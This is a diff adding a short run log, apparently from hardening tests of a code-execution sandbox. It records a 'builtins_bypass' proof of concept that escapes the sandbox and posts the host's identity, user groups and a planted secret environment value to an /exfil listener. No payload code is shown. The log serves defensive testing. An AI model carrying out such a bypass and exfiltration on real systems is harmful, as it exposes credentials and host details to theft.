@@ -1,0 +1,10 @@
+[2026-11-22T10:08:28Z] START B1_builtins_bypass src=B1 pure=poc.builtins_bypass.v1 payload=payloads/builtins_bypass.py port=8926
+[*] src=/tmp/opencode/julep-hard/B1
+[*] pure=poc.builtins_bypass.v1 bundle=bb76efa15013b1b5cd050340b132c630d3ab47760622e2ebd1b5ec24d5d27b01 signer=2152f8d19b791d24453242e15f2eab6cb7cffa7b6a5ed30097960e069881db12
+[*] registered tier=native_venv
+[listener] POST /exfil 430 bytes
+[+] exfil proof sha256=561db0c3f88ccef13934ed9dda971591e3f52e6496f3eb2e0ac6e4300c4d39da
+[*] return value: {"exfiltrated": true, "proof": {"cwd": "/tmp/opencode/julep-hard", "hostname": "kali-original", "marker": "JULEP-HARDENING-PROOF-9b1e7c", "pid": 8476, "secret_env": "sk-live-hardening-secret-3a7d2", "uid": "uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),103(scanner),107(bluetooth),124(lpadmin),132(wireshark),134(kaboxer),135(vboxsf),982(ollama)"}}
+[*] elapsed=0.05s
+PROBE_RESULT {"proof": {"cwd": "/tmp/opencode/julep-hard", "hostname": "kali-original", "marker": "JULEP-HARDENING-PROOF-9b1e7c", "pid": 8476, "secret_env": "sk-live-hardening-secret-3a7d2", "uid": "uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),103(scanner),107(bluetooth),124(lpadmin),132(wireshark),134(kaboxer),135(vboxsf),982(ollama)"}, "proof_sha256": "561db0c3f88ccef13934ed9dda971591e3f52e6496f3eb2e0ac6e4300c4d39da", "result": "EXECUTED", "value": {"exfiltrated": true, "proof": {"cwd": "/tmp/opencode/julep-hard", "hostname": "kali-original", "marker": "JULEP-HARDENING-PROOF-9b1e7c", "pid": 8476, "secret_env": "sk-live-hardening-secret-3a7d2", "uid": "uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),103(scanner),107(bluetooth),124(lpadmin),132(wireshark),134(kaboxer),135(vboxsf),982(ollama)"}}}
+[2026-11-22T10:08:29Z] END B1_builtins_bypass rc=0
